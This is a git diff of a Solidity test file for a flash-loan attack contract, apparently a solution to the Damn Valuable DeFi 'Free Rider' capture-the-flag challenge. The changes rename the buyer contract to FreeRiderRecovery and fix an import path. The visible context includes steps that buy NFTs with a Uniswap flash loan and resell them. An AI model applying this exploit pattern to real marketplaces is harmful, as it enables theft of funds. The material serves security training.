@@ -2,13 +2,13 @@
 pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
-import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
+import {FreeRiderRecovery} from "../../../src/Contracts/free-rider/FreeRiderRecovery.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
-import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 interface IUniswapV2Callee {
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
@@ -18,7 +18,7 @@ contract FreeRiderAttack is Test, IERC721Receiver, IUniswapV2Callee {
     uint256 internal constant NFT_PRICE = 15 ether;
     uint8 internal constant AMOUNT_OF_NFTS = 6;
 
-    FreeRiderBuyer internal freeRiderBuyer;
+    FreeRiderRecovery internal freeRiderRecovery;
     FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
     DamnValuableToken internal dvt;
     DamnValuableNFT internal damnValuableNFT;
@@ -29,7 +29,7 @@ contract FreeRiderAttack is Test, IERC721Receiver, IUniswapV2Callee {
     address payable internal buyer;
 
     constructor(
-        address _freeRiderBuyer,
+        address _freeRiderRecovery,
         address payable _freeRiderNFTMarketplace,
         address _dvt,
         address _damnValuableNFT,
@@ -37,7 +37,7 @@ contract FreeRiderAttack is Test, IERC721Receiver, IUniswapV2Callee {
         address payable _weth,
         address payable _attacker
     ) payable {
-        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
+        freeRiderRecovery = FreeRiderRecovery(_freeRiderRecovery);
         freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_freeRiderNFTMarketplace);
         dvt = DamnValuableToken(_dvt);
         damnValuableNFT = DamnValuableNFT(_damnValuableNFT);
@@ -70,7 +70,7 @@ contract FreeRiderAttack is Test, IERC721Receiver, IUniswapV2Callee {
 
         // 4. Sell the NFTs to the buyer
         for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
-            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i);
+            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderRecovery), i);
         }
 
         // 5. Repay the flash loan
